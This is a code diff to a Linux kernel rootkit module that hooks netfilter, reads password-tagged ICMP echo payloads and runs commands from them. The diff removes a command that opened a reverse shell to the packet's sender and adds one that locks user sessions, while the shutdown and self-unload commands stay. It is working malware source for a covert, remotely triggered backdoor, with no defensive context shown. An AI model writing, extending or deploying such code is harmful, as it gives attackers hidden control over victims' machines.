@@ -18,9 +18,6 @@
 #include <linux/inet.h>
 #include <linux/icmp.h>
 
-#include <linux/sched.h>
-#include <linux/kthread.h>
-
 //-------------------------------------------------------------------------------------------
 
 MODULE_LICENSE("GPL");
@@ -33,7 +30,7 @@ MODULE_LICENSE("GPL");
 #define PASSWD "rkit"
 #define CMD_SHUTDOWN "shutdown"
 #define CMD_UNLOAD "unload"
-#define CMD_SHELL "cmd"
+#define CMD_LOCK "lock"
 
 #define DEBUG
 
@@ -51,12 +48,7 @@ struct udphdr *udp_header;
 struct iphdr *ip_header;
 struct ethhdr *mac_header;
 struct icmphdr *icmp_header;
-static struct task_struct *shell_task;
 char data[1024] = {0};
-
-//-------------------------------------------------------------------------------------------
-
-
 
 //-------------------------------------------------------------------------------------------
 
@@ -74,11 +66,10 @@ int reverse_shell(char *ip, int port){
 
 //-------------------------------------------------------------------------------------------
 
-int execute_command(char *data, char *src, int port) {
+int execute_command(char *data) {
 	if (strncmp(data, PASSWD, strlen(PASSWD)) != 0) {
 		#ifdef DEBUG
 		printk(KERN_INFO "LKM: Received password: INVALID\n");
-        printk("\n");
 		#endif		
 		return 1;
 	}
@@ -88,28 +79,25 @@ int execute_command(char *data, char *src, int port) {
 	if (strncmp(data, CMD_SHUTDOWN, strlen(CMD_SHUTDOWN)) == 0) {
 		#ifdef DEBUG
 		printk(KERN_INFO "LKM: Received shutdown command.\n");
-        printk("\n");
 		#endif
 
 		char *argv[] = {"/sbin/shutdown", "now", "&", NULL};	// Fill calling program with shutdown now
-	    call_usermodehelper(argv[0], argv, NULL, UMH_WAIT_EXEC);	// Call command in user land
+	    call_usermodehelper(argv[0], argv, NULL, UMH_NO_WAIT);	// Call command in user land
 
 	} else if (strncmp(data, CMD_UNLOAD, strlen(CMD_UNLOAD)) == 0) {
 		#ifdef DEBUG
 		printk(KERN_INFO "LKM: Received unload command.\n");
-        printk("\n");
 		#endif
 		unload(THIS_MODULE->name);
-	} else if (strncmp(data, CMD_SHELL, strlen(CMD_SHELL)) == 0) {
+	} else if (strncmp(data, CMD_LOCK, strlen(CMD_LOCK)) == 0) {
 		#ifdef DEBUG
-		printk(KERN_INFO "LKM: Received shell command.\n");
-        printk(KERN_INFO "LKM: Target: %s\n", src);
-        printk(KERN_INFO "LKM: Port: %d\n", port);
+		printk(KERN_INFO "LKM: Received screen lock command.\n");
 		#endif
 
-        reverse_shell(src, port);
+		char *argv[] = {"/bin/loginctl", "lock-sessions", "&", NULL};	// Fill calling program with shutdown now
+	    call_usermodehelper(argv[0], argv, NULL, UMH_WAIT_EXEC);	// Call command in user land
 	}
-	
+
 	return 0;
 }
 
@@ -134,11 +122,8 @@ unsigned int hook_func(void *priv, struct sk_buff *skb, const struct nf_hook_sta
 		printk(KERN_INFO "ID: %hu\n", (unsigned short int) REVERSE_SHORT(icmp_header->un.echo.id));
 		printk(KERN_INFO "Data: %s\n", data);
 		#endif
-		
-		char src[16] = {0};
-		snprintf(src, 16, "%pI4", &ip_header->saddr);
 
-		execute_command(data, src, (int) REVERSE_SHORT(icmp_header->un.echo.id));
+		execute_command(data);
 	}
 	
 	return NF_ACCEPT;
